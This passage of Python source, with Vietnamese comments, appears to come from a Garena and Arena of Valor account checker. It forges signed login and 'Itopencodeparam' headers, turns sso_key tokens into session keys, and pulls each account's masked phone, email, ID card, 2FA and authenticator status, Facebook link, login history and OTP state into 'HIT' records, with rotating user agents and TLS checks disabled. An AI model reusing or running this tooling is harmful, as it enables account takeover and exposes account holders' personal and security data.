                                if parsed.get("rank") or parsed.get("rank_stars") or parsed.get("role_job"):
                                    parsed["_api"] = host + "/api/user/game/getselfuserinfo"
                                    return parsed
                        except Exception:
                            pass
    return {}


def _kgcamp_full_flow(sess, host, origin, uid_s, aov_token, aov_open_id, ua, proxy=None) -> dict:
    """Flow chuẩn kgvn-camp: itop login → itopencodeparam → getcredential → EncodeParam → selfinfo."""
    import time as _time
    import hashlib as _hl
    import json as _json

    try:
        import itop_module as _itop
    except Exception:
        return {}

    # 1) itop auth/login: openid=uid, token=aov_access_token → itop_openid + itop_token
    ts = int(_time.time())
    up = {
        "channelid": "10", "ts": str(ts), "os": "1",
        "gameid": "1137", "version": "1", "seq": "1",
    }
    sorted_qs = "&".join("%s=%s" % (k, up[k]) for k in sorted(up))
    body = {
        "channel_dis": "10",
        "openid": uid_s,
        "token": aov_token,
        "channel_info": {
            "uuid": uid_s, "token": aov_token,
            "channel": "Garena", "platform": "Android", "channelid": "10",
        },
    }
    body_str = _json.dumps(body)
    sig = _hl.md5(("/v2/auth/login?" + sorted_qs + body_str + _itop.SDK_KEY).encode()).hexdigest()
    try:
        r = sess.post(
            _itop.HOST + "/v2/auth/login?" + sorted_qs + "&sig=" + sig,
            headers={"Content-Type": "application/json", "User-Agent": ua},
            json=body, verify=False, timeout=10,
        )
        if r.status_code != 200:
            return {}
        lj = r.json()
    except Exception:
        return {}
    if lj.get("ret") != 0 or not lj.get("openid") or not lj.get("token"):
        return {}
    itop_openid = str(lj["openid"])
    itop_token = str(lj["token"])

    # 2) forge Msdk-Itopencodeparam
    plain = ("openid=%s&access_token=%s&gopenid=%s"
             % (aov_open_id, itop_token, itop_openid)).encode()
    try:
        param = _itop.forge_param(plain, randseed=1)
    except Exception:
        return {}

    base_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": origin,
        "Referer": origin + "/app",
        "Camp-Source": "AOV-CAMP",
        "Camp-Authtype": "msdk",
        "Aov-Region": "1137",
        "Aov-Language": "vi",
        "Msdk-Gameid": "1137",
        "Msdk-Channelid": "10",
        "Msdk-Os": "1",
        "areaid": "1",
        "logicworldid": "1011",
        "Msdk-Itopencodeparam": param,
    }

    # 3) getcredential → encryption + roleId
    try:
        r = sess.post(host + "/api/user/game/getcredential", headers=base_headers,
                      json={}, verify=False, timeout=10)
        if r.status_code != 200:
            return {}
        gd = r.json()
        if gd.get("code") != 0 or not isinstance(gd.get("data"), dict):
            return {}
        encryption = gd["data"].get("encryption") or ""
        role_id = gd["data"].get("roleId") or ""
    except Exception:
        return {}
    if not encryption or not role_id:
        return {}

    # 4) EncodeParam qua node (camp-security-oversea, Tencent Chaos VM).
    #    Mỗi Encodeparam là nonce dùng 1 lần → cần 3 cái tươi cho 3 request.
    try:
        from encode_param_helper import get_encode_params as _geps
    except Exception:
        return {}
    enc_params = _geps(encryption, role_id, 3)
    if not enc_params or len(enc_params) < 3 or not enc_params[0]:
        return {}

    # 5) getselfuserinfo kèm Encodeparam
    h = dict(base_headers)
    h["Encodeparam"] = enc_params[0]
    parsed = {}
    try:
        r = sess.post(host + "/api/user/game/getselfuserinfo", headers=h,
                      json={}, verify=False, timeout=10)
        if r.status_code == 200:
            parsed = _parse_kgcamp_rank_payload(r.json())
    except Exception:
        parsed = {}

    # 6) rank mùa: season/list → season/detail (seasonId mới nhất)
    try:
        h2 = dict(base_headers)
        h2["Encodeparam"] = enc_params[1]
        rl = sess.post(host + "/api/user/season/list", headers=h2,
                       json={}, verify=False, timeout=10)
        if rl.status_code == 200:
            seasons = _parse_kgcamp_season_list(rl.json())
            if seasons:
                sid = seasons[0].get("season_id")
                if sid:
                    h3 = dict(base_headers)
                    h3["Encodeparam"] = enc_params[2]
                    rd = sess.post(host + "/api/user/season/detail", headers=h3,
                                   json={"seasonId": str(sid)}, verify=False, timeout=10)
                    if rd.status_code == 200:
                        season = _parse_kgcamp_season(rd.json())
                        if season:
                            season["_season_list"] = seasons
                            parsed["_season"] = season
    except Exception:
        pass

    return parsed


def _truthy_mask(val) -> bool:
    """True nếu mask email/SĐT/CCCD có nội dung thật (không chỉ * / rỗng)."""
    if val is None:
        return False
    s = str(val).strip()
    if not s or s.lower() in {"null", "none", "undefined", "n/a", "-"}:
        return False
    # còn ít nhất 1 ký tự không phải mask/separator
    core = re.sub(r"[\s\*xX\#\-\._@+]", "", s)
    return bool(core)


def _is_empty_val(v) -> bool:
    """Placeholder rỗng / 0 / false / error-string — không được đè field tốt."""
    if v is None:
        return True
    if isinstance(v, bool):
        return v is False
    if isinstance(v, (int, float)):
        return v == 0
    if isinstance(v, (str, bytes, bytearray)):
        s = str(v).strip()
        if not s:
            return True
        return s.lower() in {
            "null", "none", "undefined", "n/a", "na", "-", "error", "fail",
            "timeout", "unknown", "0", "false", "no",
        }
    if isinstance(v, (list, tuple, set, dict)):
        return len(v) == 0
    return False


def _prefer_str_field(cur, new, maskish: bool = False):
    """Giữ chuỗi tốt hơn; new rỗng không wipe cur."""
    if _is_empty_val(new):
        return cur
    if _is_empty_val(cur):
        return new
    if maskish:
        if _truthy_mask(new) and (
            not _truthy_mask(cur) or len(str(new).strip()) > len(str(cur).strip())
        ):
            return new
        return cur
    # ưu tiên dài hơn nếu cả hai có nội dung
    try:
        if len(str(new).strip()) > len(str(cur).strip()) * 1.25:
            return new
    except Exception:
        pass
    return cur


def _prefer_max_int(cur, new, default: int = 0) -> int:
    try:
        c = int(cur if cur is not None else default)
    except Exception:
        c = default
    try:
        n = int(new if new is not None else default)
    except Exception:
        n = default
    return n if n > c else c


def _prefer_true_flag(cur, new) -> bool:
    return bool(cur) or bool(new)


def _merge_skins_prefer(old, new) -> dict:
    """
    Gộp aov_skins: không để partial (total=0 / thiếu list) đè bản đầy đủ.
    Counters = max; list fields (ownedItemIdList, ss_list, …) giữ bản dài hơn
    kể cả khi phía kia có _skins_ok.
    """
    o = old if isinstance(old, dict) else {}
    n = new if isinstance(new, dict) else {}
    if not n:
        return dict(o) if o else {}
    if not o:
        return dict(n)
    try:
        to = int(o.get("total_skins") or 0)
    except Exception:
        to = 0
    try:
        tn = int(n.get("total_skins") or 0)
    except Exception:
        tn = 0

    def _list_len(d, k):
        v = d.get(k) if isinstance(d, dict) else None
        return len(v) if isinstance(v, (list, tuple)) else 0

    def _richness(d, tot):
        s = int(tot or 0) * 10
        if d.get("_skins_ok"):
            s += 5
        for k in ("ownedItemIdList", "ss_list", "sss_list", "anime_list", "other_list", "user_packs"):
            s += min(_list_len(d, k), 80)
        return s

    # Chọn base theo total, rồi richness — KHÔNG replace mù vì chỉ _skins_ok
    if tn > to:
        out = dict(n)
        other = o
    elif to > tn:
        out = dict(o)
        other = n
    elif _richness(n, tn) > _richness(o, to):
        out = dict(n)
        other = o
    else:
        out = dict(o)
        other = n

    # merge scalar / non-empty từ other
    for k, v in other.items():
        if v in (None, "", [], {}):
            continue
        if k not in out or out.get(k) in (None, "", [], {}, 0):
            out[k] = v
        elif isinstance(v, (int, float)) and isinstance(out.get(k), (int, float)):
            if float(v) > float(out[k]):
                out[k] = v

    # list fields: luôn giữ bản dài hơn từ o hoặc n (tránh wipe ownedItemIdList)
    list_keys = set()
    for d in (o, n):
        for k, v in d.items():
            if isinstance(v, (list, tuple)):
                list_keys.add(k)
    for k in list_keys:
        ol = o.get(k) if isinstance(o.get(k), (list, tuple)) else []
        nl = n.get(k) if isinstance(n.get(k), (list, tuple)) else []
        if len(nl) > len(ol):
            out[k] = list(nl)
        elif ol:
            out[k] = list(ol)
        elif nl:
            out[k] = list(nl)

    # ints max cho counters
    for k in ("total_skins", "total_champs", "ss", "sss", "anime", "other", "cp"):
        try:
            ov = int(o.get(k) or 0)
            nv = int(n.get(k) or 0)
            out[k] = max(ov, nv, int(out.get(k) or 0))
        except Exception:
            pass
    if o.get("_skins_ok") or n.get("_skins_ok"):
        out["_skins_ok"] = True
    return out


def _safe_int_flag(v, default=0) -> int:
    try:
        if v is None or v is False:
            return default
        if v is True:
            return 1
        if isinstance(v, str) and not v.strip():
            return default
        return int(float(v))
    except Exception:
        return default


def _apply_acct_sec(result: dict, acct_sec: dict) -> None:
    """
    Merge account.garena.com security payload into a HIT result.
    QUAN TRỌNG: không ghi đè field tốt bằng chuỗi rỗng / 0 từ payload partial.
    """
    if not acct_sec or not isinstance(acct_sec, dict):
        return

    phone = acct_sec.get('masked_phone') or ''
    if _truthy_mask(phone):
        result['masked_phone'] = str(phone).strip()
        result['mobile_bound'] = True

    email = acct_sec.get('masked_email') or ''
    if _truthy_mask(email):
        result['masked_email'] = str(email).strip()

    ev = _safe_int_flag(acct_sec.get('email_v'), -1)
    if ev >= 0:
        # chỉ nâng email_v, không hạ 1→0 nếu payload thiếu
        try:
            cur = int(result.get('email_v') or 0)
        except Exception:
            cur = 0
        if ev > cur:
            result['email_v'] = ev
        elif 'email_v' not in result:
            result['email_v'] = ev
        if ev > 0:
            result['email_verified'] = True

    idc = acct_sec.get('idcard') or ''
    if _truthy_mask(idc):
        result['idcard'] = str(idc).strip()

    auth = _safe_int_flag(acct_sec.get('authenticator_enable'), -1)
    if auth > 0 or (auth == 0 and result.get('authenticator_enable') is None):
        if auth > 0 or not result.get('authenticator_enable'):
            if auth > 0:
                result['authenticator_enable'] = auth
            elif 'authenticator_enable' not in result:
                result['authenticator_enable'] = 0

    tsv = _safe_int_flag(acct_sec.get('two_step_verify'), -1)
    if tsv > 0:
        result['two_step_verify'] = tsv
    elif tsv == 0 and 'two_step_verify' not in result:
        result['two_step_verify'] = 0

    if acct_sec.get('country_code'):
        result['country_code'] = str(acct_sec.get('country_code', '')).strip()
    if acct_sec.get('acc_country'):
        result['acc_country'] = str(acct_sec.get('acc_country', '')).strip()
    if acct_sec.get('country'):
        c = str(acct_sec.get('country', '')).strip()
        if c and c.upper() not in {"UNKNOWN", "NONE", "NULL"}:
            result['country'] = c
    if acct_sec.get('fb_connected'):
        result['fb_linked'] = True
    fb_name = acct_sec.get('fb_account')
    if isinstance(fb_name, dict):
        # lấy uid trước khi convert name
        uid = _extract_fb_uid_from_obj(fb_name)
        if uid and not result.get('fb_uid'):
            result['fb_uid'] = uid
            result['fb_linked'] = True
        fb_name = fb_name.get('fb_username') or fb_name.get('name') or fb_name.get('username') or ''
    if fb_name and not str(fb_name).isdigit():
        result['fb_account_name'] = str(fb_name)
    # FB UUID từ account/init (ưu tiên giữ nếu đã có)
    for key in ('fb_uid_from_init', 'fb_uid', 'facebook_id', 'fb_id'):
        uid = _normalize_fb_uid(acct_sec.get(key))
        if uid:
            if not result.get('fb_uid'):
                result['fb_uid'] = uid
            result['fb_linked'] = True
            break

    sus = _safe_int_flag(acct_sec.get('suspicious'), -1)
    if sus > 0:
        result['suspicious'] = 1
    elif sus == 0 and 'suspicious' not in result:
        result['suspicious'] = 0

    if acct_sec.get('login_history'):
        # Ưu tiên list dài hơn / có data
        old = result.get('login_history') or []
        new = acct_sec['login_history']
        if not old or (isinstance(new, list) and len(new) >= len(old or [])):
            result['login_history'] = new
    if acct_sec.get('sensitive_ops'):
        old = result.get('sensitive_ops') or []
        new = acct_sec['sensitive_ops']
        if not old or (isinstance(new, list) and len(new) >= len(old or [])):
            result['sensitive_ops'] = new
    if acct_sec.get('init_ip') and not result.get('init_ip'):
        result['init_ip'] = acct_sec['init_ip']
    if acct_sec.get('username') and not result.get('username'):
        result['username'] = acct_sec.get('username', '')
    if acct_sec.get('nickname') and not result.get('nickname'):
        result['nickname'] = acct_sec.get('nickname', '')
    if acct_sec.get('uid') and not result.get('uid'):
        result['uid'] = acct_sec.get('uid')
    if acct_sec.get('password_set'):
        result['password_set'] = True
    if acct_sec.get('password_s') is not None:
        result['password_s'] = acct_sec.get('password_s')
        try:
            if int(acct_sec.get('password_s') or 0) > 0:
                result['password_set'] = True
        except Exception:
            pass
    if 'whitelistable' in acct_sec:
        result['whitelistable'] = bool(acct_sec.get('whitelistable'))
    if acct_sec.get('shell') is not None:
        try:
            sh = int(acct_sec.get('shell') or 0)
            if sh and not result.get('shells'):
                result['shells'] = sh
            elif sh > int(result.get('shells') or 0):
                result['shells'] = sh
        except Exception:
            pass
    if acct_sec.get('signature') is not None and not result.get('signature'):
        result['signature'] = acct_sec.get('signature') or ''
    if acct_sec.get('avatar') and not result.get('avatar'):
        result['avatar'] = acct_sec.get('avatar')
    if acct_sec.get('account_status') is not None:
        result['account_status'] = acct_sec.get('account_status')
    if acct_sec.get('mobile_binding_status') is not None:
        result['mobile_binding_status'] = acct_sec.get('mobile_binding_status')
        try:
            if int(acct_sec.get('mobile_binding_status') or 0) > 0:
                result['mobile_bound'] = True
        except Exception:
            pass
    if acct_sec.get('email_verified_time'):
        result['email_verified_time'] = acct_sec.get('email_verified_time')
        result['email_verified'] = True
    if 'email_verify_available' in acct_sec:
        result['email_verify_available'] = bool(acct_sec.get('email_verify_available'))
    if 'whitelist_suspicious' in acct_sec:
        result['whitelist_suspicious'] = int(acct_sec.get('whitelist_suspicious') or 0)
        if result['whitelist_suspicious']:
            result['suspicious'] = 1
    if acct_sec.get('game_otp_next_action'):
        result['game_otp_next_action'] = acct_sec['game_otp_next_action']
    if acct_sec.get('otp_token_next_action'):
        result['otp_token_next_action'] = acct_sec['otp_token_next_action']
    if acct_sec.get('authenticator_algorithm') is not None:
        result['authenticator_algorithm'] = acct_sec.get('authenticator_algorithm')
    if acct_sec.get('prioritized_unlock_bind_tool') is not None:
        result['prioritized_unlock_bind_tool'] = acct_sec.get('prioritized_unlock_bind_tool')
    if isinstance(acct_sec.get('send_otp_methods'), dict):
        result['send_otp_methods'] = acct_sec.get('send_otp_methods')
    if isinstance(acct_sec.get('game_otp_configs'), dict):
        result['game_otp_configs'] = acct_sec.get('game_otp_configs')

    # Suy luận binding từ mask sau merge
    if _truthy_mask(result.get('masked_phone')):
        result['mobile_bound'] = True
    if _truthy_mask(result.get('masked_email')) and int(result.get('email_v') or 0) > 0:
        result['email_verified'] = True


def _cookie_get_ci(sess, name: str) -> str:
    """Case-insensitive cookie lookup from a requests session."""
    if sess is None or not name:
        return ""
    want = name.lower()
    try:
        for c in sess.cookies:
            if str(getattr(c, "name", "") or "").lower() == want:
                val = str(getattr(c, "value", "") or "").strip()
                if val:
                    return val
    except Exception:
        pass
    try:
        val = sess.cookies.get(name)
        if val:
            return str(val).strip()
    except Exception:
        pass
    return ""


def _pull_session_key_from_text(text: str) -> str:
    """Extract session_key=... from a URL / redirect / free-form string."""
    if not text:
        return ""
    m = re.search(r"(?:session_key|sessionKey)=([^&\s#;\"']+)", str(text), re.I)
    if m:
        return urllib.parse.unquote(m.group(1)).strip()
    return ""


def _extract_session_key_from_response(resp, sess=None) -> str:
    """
    Pull session_key from JSON body / redirect_uri / Set-Cookie / cookie jar / Location.

    Real universal/login 200 body shape (observed):
      {"redirect_uri": "https://account.garena.com/?session_key=HEX...", "id": "..."}
    Cookie may only have sso_key — session_key lives in redirect_uri.
    """
    if resp is None and sess is None:
        return ""
    candidates = []

    if resp is not None:
        # JSON body — top-level keys + nested redirect_uri / any string with session_key=
        try:
            data = resp.json()
            if isinstance(data, dict):
                for k in ("session_key", "sessionKey", "session"):
                    v = data.get(k)
                    if v is not None and str(v).strip():
                        candidates.append(str(v).strip())
                # CRITICAL: session_key is often only inside redirect_uri query string
                for k in ("redirect_uri", "redirectUri", "url", "location", "next"):
                    sk = _pull_session_key_from_text(data.get(k) or "")
                    if sk:
                        candidates.append(sk)
                # Scan remaining string values defensively
                for v in data.values():
                    if isinstance(v, str) and "session_key=" in v.lower():
                        sk = _pull_session_key_from_text(v)
                        if sk:
                            candidates.append(sk)
        except Exception:
            pass

        # Location / redirect URL header
        try:
            loc = resp.headers.get("Location") or resp.headers.get("location") or ""
            sk = _pull_session_key_from_text(loc)
            if sk:
                candidates.append(sk)
        except Exception:
            pass

        # Set-Cookie header(s)
        try:
            raw_sc = []
            if hasattr(resp.headers, "getlist"):
                raw_sc = resp.headers.getlist("Set-Cookie") or []
            if not raw_sc:
                sc = resp.headers.get("Set-Cookie") or resp.headers.get("set-cookie") or ""
                if sc:
                    raw_sc = [sc]
            for sc in raw_sc:
                m = re.search(r"(?:^|[,;\s])session_key=([^;,\s]+)", sc, re.I)
                if m:
                    candidates.append(urllib.parse.unquote(m.group(1)).strip())
        except Exception:
            pass

        # Raw body text fallback
        try:
            sk = _pull_session_key_from_text(getattr(resp, "text", "") or "")
            if sk:
                candidates.append(sk)
        except Exception:
            pass

    # Cookie jar
    if sess is not None:
        for name in ("session_key", "sessionKey"):
            v = _cookie_get_ci(sess, name)
            if v:
                candidates.append(v)

    for c in candidates:
        c = (c or "").strip().strip('"').strip("'")
        # Prefer real session keys (typically 64 hex); skip bare "sso_key" cookie noise only if empty
        if c and c.lower() not in {"null", "none", "undefined", "0"}:
            return c
    return ""


def _user_info_is_valid(ui) -> bool:
    """True when account/init returned a real profile (even if all bindings empty)."""
    if not isinstance(ui, dict) or not ui:
        return False
    if ui.get("uid") or ui.get("user_id") or ui.get("username") or ui.get("nickname"):
        return True
    # Acc trắng vẫn có shape profile; error_session thì user_info rỗng/không có key này
    profile_keys = (
        "mobile_no", "email", "email_v", "acc_country", "country", "country_code",
        "authenticator_enable", "two_step_verify_enable", "is_fbconnect_enabled",
        "idcard", "shell", "shells", "password_set", "create_time", "timestamp",
    )
    return any(k in ui for k in profile_keys)


def _parse_account_init_payload(data) -> dict:
    """Parse account/init JSON → security dict. Empty if auth failed / profile missing."""
    if not isinstance(data, dict) or not data:
        return {}
    err = data.get("error") or data.get("error_code") or data.get("error_msg")
    # error_session / invalid key → reject
    if err:
        err_s = str(err).strip().lower()
        if err_s and err_s not in {"0", "ok", "success", "none", "null"}:
            return {}
    ui = data.get("user_info")
    if ui is None and isinstance(data.get("data"), dict):
        ui = data.get("data", {}).get("user_info") or data.get("data")
    if not _user_info_is_valid(ui):
        return {}

    info = {}
    # phone: mobile_no / mobile / phone / display_mobile_no
    phone = (
        ui.get("mobile_no")
        or ui.get("mobile")
        or ui.get("phone")
        or ui.get("display_mobile_no")
        or ""
    )
    cc = ui.get("country_code", "") or ui.get("mobile_country_code", "") or ""
    phone_s = str(phone).strip() if phone is not None else ""
    if phone_s and re.sub(r"[\s\*xX\#\-]", "", phone_s):
        if phone_s.startswith("+"):
            info["masked_phone"] = phone_s
        elif cc:
            info["masked_phone"] = f"+{cc} {phone_s}"
        else:
            info["masked_phone"] = phone_s
    else:
        info["masked_phone"] = ""

    email = ui.get("email") or ui.get("email_address") or ui.get("masked_email") or ""
    info["masked_email"] = str(email).strip() if email else ""
    info["email_v"] = _safe_int_flag(ui.get("email_v") if "email_v" in ui else ui.get("email_verified"), 0)
    if ui.get("email_verified") and not info["email_v"]:
        info["email_v"] = 1
    info["idcard"] = str(ui.get("idcard") or ui.get("id_card") or ui.get("cmnd") or "").strip()
    info["authenticator_enable"] = _safe_int_flag(
        ui.get("authenticator_enable") if "authenticator_enable" in ui else ui.get("authenticator_enabled"), 0
    )
    info["two_step_verify"] = _safe_int_flag(
        ui.get("two_step_verify_enable")
        if "two_step_verify_enable" in ui
        else (ui.get("two_step_verify") if "two_step_verify" in ui else ui.get("two_step_verify_status")),
        0,
    )
    info["fb_connected"] = bool(
        ui.get("is_fbconnect_enabled")
        or ui.get("fb_connected")
        or ui.get("facebook_connected")
        or ui.get("fb_bound")
    )
    # fb_account may be str OR dict {"fb_uid","fb_username",...}
    fb_acc = ui.get("fb_account") or ui.get("facebook") or ui.get("fb_info") or ui.get("facebook_account")
    if isinstance(fb_acc, dict):
        info["fb_account"] = (
            fb_acc.get("fb_username")
            or fb_acc.get("name")
            or fb_acc.get("fb_name")
            or fb_acc.get("username")
            or ""
        )
        uid = _extract_fb_uid_from_obj(fb_acc) or _normalize_fb_uid(
            fb_acc.get("fb_uid") or fb_acc.get("facebook_id") or fb_acc.get("fb_id")
            or fb_acc.get("uid") or fb_acc.get("id")
        )
        if uid:
            info["fb_uid_from_init"] = uid
        if not info["fb_connected"] and (uid or info["fb_account"]):
            info["fb_connected"] = True
    elif fb_acc:
        # string: username hoặc numeric uid
        uid = _normalize_fb_uid(fb_acc)
        if uid:
            info["fb_uid_from_init"] = uid
            info["fb_connected"] = True
            info["fb_account"] = ""
        else:
            info["fb_account"] = str(fb_acc)
    else:
        info["fb_account"] = ""
    # top-level fb id fields
    if not info.get("fb_uid_from_init"):
        for k in ("fb_uid", "facebook_id", "fb_id", "facebook_uid", "fbUid"):
            uid = _normalize_fb_uid(ui.get(k))
            if uid:
                info["fb_uid_from_init"] = uid
                info["fb_connected"] = True
                break
    info["acc_country"] = ui.get("acc_country") or ""
    info["country"] = ui.get("country") or ""
    if not info["country"]:
        info["country"] = data.get("country") or ""
    info["country_code"] = str(ui.get("country_code") or "").strip()
    if ui.get("authenticator_algorithm") is not None:
        try:
            info["authenticator_algorithm"] = int(ui.get("authenticator_algorithm"))
        except Exception:
            info["authenticator_algorithm"] = ui.get("authenticator_algorithm")
    if ui.get("prioritized_unlock_bind_tool") is not None:
        try:
            info["prioritized_unlock_bind_tool"] = int(ui.get("prioritized_unlock_bind_tool"))
        except Exception:
            info["prioritized_unlock_bind_tool"] = ui.get("prioritized_unlock_bind_tool")
    info["suspicious"] = 1 if ui.get("suspicious") else 0
    info["init_ip"] = data.get("init_ip", "") or ""
    # password_s > 0 ⇒ có mật khẩu (TCP 342 hay miss)
    try:
        pw_s = int(ui.get("password_s") or 0)
    except Exception:
        pw_s = 0
    if pw_s > 0:
        info["password_set"] = True
        info["password_s"] = pw_s
    if ui.get("nickname"):
        info["nickname"] = ui.get("nickname")
    if ui.get("shell") is not None:
        info["shell"] = ui.get("shell")
    if "whitelistable" in ui:
        info["whitelistable"] = bool(ui.get("whitelistable"))
    elif "whitelistable" in data:
        info["whitelistable"] = bool(data.get("whitelistable"))
    if ui.get("username"):
        info["username"] = ui.get("username")
    if ui.get("uid") is not None:
        info["uid"] = ui.get("uid")
    elif ui.get("user_id") is not None:
        info["uid"] = ui.get("user_id")
    # Hidden profile fields (from account.garena.com JS surface + init dump)
    if ui.get("signature") is not None:
        info["signature"] = str(ui.get("signature") or "").strip()
    if ui.get("avatar"):
        info["avatar"] = str(ui.get("avatar") or "").strip()
    if ui.get("status") is not None:
        try:
            info["account_status"] = int(ui.get("status"))
        except Exception:
            info["account_status"] = ui.get("status")
    if ui.get("mobile_binding_status") is not None:
        try:
            info["mobile_binding_status"] = int(ui.get("mobile_binding_status"))
        except Exception:
            info["mobile_binding_status"] = ui.get("mobile_binding_status")
    if ui.get("email_verified_time"):
        try:
            evt = int(ui.get("email_verified_time") or 0)
            if evt > 0:
                info["email_verified_time"] = evt
        except Exception:
            pass
    if "email_verify_available" in ui:
        info["email_verify_available"] = bool(ui.get("email_verify_available"))

    raw_hist = data.get("login_history") or []
    hist = []
    for h in raw_hist[:10]:
        if not isinstance(h, dict):
            continue
        ts = _norm_unix_ts(h.get("timestamp", 0) or h.get("login_time", 0) or 0)
        dt_str = _safe_fromtimestamp(ts, '%d-%m-%Y %H:%M') if ts else ''
        hist.append({
            "ip": h.get("ip", ""),
            "country": h.get("country", ""),
            "game": h.get("source", "") or h.get("game_name", "") or h.get("app_name", ""),
            "time": dt_str,
            "ts": ts,
        })
    info["login_history"] = hist

    raw_ops = data.get("sensitive_operation") or []
    ops = []
    for op in raw_ops[:5]:
        if not isinstance(op, dict):
            continue
        ts = _norm_unix_ts(op.get("timestamp", 0) or op.get("operation_time", 0) or op.get("op_time", 0) or 0)
        dt_str = _safe_fromtimestamp(ts, '%d-%m-%Y %H:%M') if ts else ''
        ops.append({
            "type": op.get("operation", "") or op.get("operation_type", "") or op.get("op_type", ""),
            "ip": op.get("ip", ""),
            "country": op.get("country", ""),
            "time": dt_str,
        })
    info["sensitive_ops"] = ops

    if isinstance(data.get("game_otp_configs"), dict):
        info["game_otp_configs"] = data.get("game_otp_configs")
    if isinstance(ui.get("send_otp_methods"), dict):
        info["send_otp_methods"] = ui.get("send_otp_methods")
    return info


def _set_session_key_cookies(sess, session_key: str) -> None:
    if sess is None or not session_key:
        return
    for domain in (".garena.com", "account.garena.com", "sso.garena.com"):
        try:
            sess.cookies.set("session_key", session_key, domain=domain)
        except Exception:
            pass
    try:
        sess.cookies.set("session_key", session_key)
    except Exception:
        pass


def _account_whitelist_probe(sess, session_key: str, ua: str) -> dict:
    """
    GET /api/account/whitelist_user (from account.garena.com SPA JS).
    Live: returns {\"suspicious\": bool} — cross-check risk flag.
    """
    if not HAS_REQUESTS or sess is None or not session_key:
        return {}
    try:
        resp = sess.get(
            "https://account.garena.com/api/account/whitelist_user",
            params={"session_key": session_key},
            headers={
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://account.garena.com/",
            },
            verify=False,
            timeout=min(6, _ACCT_SEC_HTTP_TIMEOUT),
        )
        if resp.status_code != 200:
            return {}
        data = resp.json()
        if not isinstance(data, dict) or data.get("error"):
            return {}
        out = {}
        if "suspicious" in data:
            out["whitelist_suspicious"] = 1 if data.get("suspicious") else 0
        return out
    except Exception:
        return {}


def _account_otp_probes(sess, session_key: str, ua: str) -> dict:
    """
    Read-only OTP status probes (from account.garena.com SPA JS):
      - /api/account/game_otp/init?region=...   → game OTP next_action
      - /api/account/otp_token/init             → OTP token next_action
    Trả status next_action (max_retry/action_type/error_count/verified_info).
    KHÔNG gửi OTP, không thực hiện action.
    """
    if not HAS_REQUESTS or sess is None or not session_key:
        return {}
    out = {}
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/",
    }
    probes = (
        ("game_otp_next_action", "https://account.garena.com/api/account/game_otp/init",
         {"session_key": session_key, "region": "vn"}),
        ("otp_token_next_action", "https://account.garena.com/api/account/otp_token/init",
         {"session_key": session_key}),
    )
    for key, url, params in probes:
        try:
            resp = sess.get(url, params=params, headers=headers,
                            verify=False, timeout=min(6, _ACCT_SEC_HTTP_TIMEOUT))
            if resp.status_code != 200:
                continue
            data = resp.json()
            if not isinstance(data, dict) or data.get("error"):
                continue
            na = data.get("next_action") or {}
            if isinstance(na, dict) and na:
                row = {
                    "max_retry": na.get("max_retry"),
                    "action_type": na.get("action_type"),
                    "error_count": na.get("error_count"),
                    "verified_info": na.get("verified_info"),
                }
                out[key] = row
        except Exception:
            continue
    return out


def _account_init_with_session_key(sess, session_key: str, ua: str) -> dict:
    """
    Call account/init the stable way: ?session_key=... (public PHP checkers).
    Also try cookie-only as fallback.
    After init OK: probe whitelist_user (hidden SPA path).
    NOTE: never call /api/account/logout — it rotates session_key.
    """
    if not HAS_REQUESTS or sess is None or not session_key:
        return {}
    session_key = str(session_key).strip()
    if not session_key:
        return {}

    # UA: prefer given, fallback desktop 1 lần (tránh spam request)
    uas = []
    for u in (ua, _random_desktop_browser_ua()):
        if u and u not in uas:
            uas.append(u)

    url = "https://account.garena.com/api/account/init"
    strategies = (
        {"session_key": session_key},  # query param — most reliable
        None,                          # cookie only
    )

    for try_ua in uas:
        headers = {
            "User-Agent": try_ua,
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://account.garena.com/",
            "Origin": "https://account.garena.com",
            "X-Requested-With": "XMLHttpRequest",
        }
        _set_session_key_cookies(sess, session_key)

        for params in strategies:
            for attempt in range(2):
                try:
                    resp = sess.get(
                        url,
                        params=params,
                        headers=headers,
                        verify=False,
                        timeout=_ACCT_SEC_HTTP_TIMEOUT,
                    )
                    if resp.status_code in (403, 429, 502, 503):
                        time.sleep(0.3 * (attempt + 1))
                        continue
                    if resp.status_code != 200:
                        break
                    try:
                        data = resp.json()
                    except Exception:
                        break
                    info = _parse_account_init_payload(data)
                    if info:
                        wl = _account_whitelist_probe(sess, session_key, try_ua)
                        if wl:
                            info.update(wl)
                            if wl.get("whitelist_suspicious"):
                                info["suspicious"] = 1
                        otp = _account_otp_probes(sess, session_key, try_ua)
                        if otp:
                            info.update(otp)
                        return info
                    err = ""
                    if isinstance(data, dict):
                        err = str(data.get("error") or data.get("error_code") or "")
                    # key chết → bỏ UA/strategy này
                    if "session" in err.lower() or "auth" in err.lower() or "login" in err.lower():
                        break
                except Exception:
                    time.sleep(0.2 * (attempt + 1))
                    continue
    return {}


def _exchange_sso_key_for_session(sess, sso_key: str, ua: str) -> str:
    """
    sso.garena.com/api/universal/login → session_key.
    Accept HTTP 200 and redirect 302/303 (SSO success often redirects).
    """
    if not HAS_REQUESTS or sess is None or not sso_key:
        return ""
    sso_key = str(sso_key).strip()
    if not sso_key:
        return ""
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/",
    }
    params = {
        "app_id": "10100",
        "sso_key": sso_key,
        "redirect_uri": "https://account.garena.com/",
        "format": "json",
        "id": str(int(time.time() * 1000)),
    }
    try:
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers=headers,
            params=params,
            verify=False,
            timeout=_ACCT_SEC_HTTP_TIMEOUT,
            allow_redirects=False,
        )
        if resp.status_code not in (200, 301, 302, 303, 307, 308):
            return ""
        sk = _extract_session_key_from_response(resp, sess)
        if sk:
            return sk
        # One-hop follow when redirect didn't put key in Location text
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location") or resp.headers.get("location") or ""
            if loc:
                try:
                    if loc.startswith("/"):
                        loc = urllib.parse.urljoin("https://sso.garena.com/", loc)
                    resp2 = sess.get(
                        loc,
                        headers=headers,
                        verify=False,
                        timeout=_ACCT_SEC_HTTP_TIMEOUT,
                        allow_redirects=True,
                    )
                    sk = _extract_session_key_from_response(resp2, sess)
                    if sk:
                        return sk
                except Exception:
                    pass
        return _cookie_get_ci(sess, "session_key")
